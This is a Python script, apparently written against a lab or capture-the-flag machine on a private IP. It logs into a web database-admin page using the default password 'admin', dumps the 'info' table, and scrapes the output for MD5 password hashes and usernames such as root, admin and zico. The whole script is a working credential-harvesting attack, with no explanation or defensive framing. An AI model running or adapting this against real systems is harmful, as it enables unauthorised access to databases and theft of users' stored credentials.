import urllib.request, urllib.parse, http.cookiejar, re, socket
socket.setdefaulttimeout(15)
base = "http://192.168.18.132"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login
login_url = base + "/dbadmin/test_db.php"
post_data = urllib.parse.urlencode({"password": "admin", "login": "Login"}).encode()
req = urllib.request.Request(login_url, data=post_data, headers={
    "User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"
})
opener.open(req, timeout=10)

# Query the info table
print("=== Querying info table ===")
url = login_url + "?action=row_view&table=info"
req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
resp = opener.open(req, timeout=10)
html = resp.read().decode("utf-8", errors="ignore")

# Extract table data
print("Raw HTML length:", len(html))

# Find table rows
rows = re.findall(r'<tr[^>]*>(.*?)</tr>', html, re.DOTALL)
print(f"Found {len(rows)} rows")

for i, row in enumerate(rows[:15]):
    # Extract cell data
    cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
    if cells:
        clean_cells = [re.sub(r"<[^>]+>", "", c).strip() for c in cells]
        print(f"Row {i}: {clean_cells}")

# Look for password patterns specifically
print("\n=== Looking for credentials ===")
passwords = re.findall(r"([a-f0-9]{32})", html)
print(f"MD5 hashes: {passwords}")

# Any username patterns
users = re.findall(r"(root|admin|zico|user)\s*[=:]", html, re.I)
print(f"User mentions: {users}")
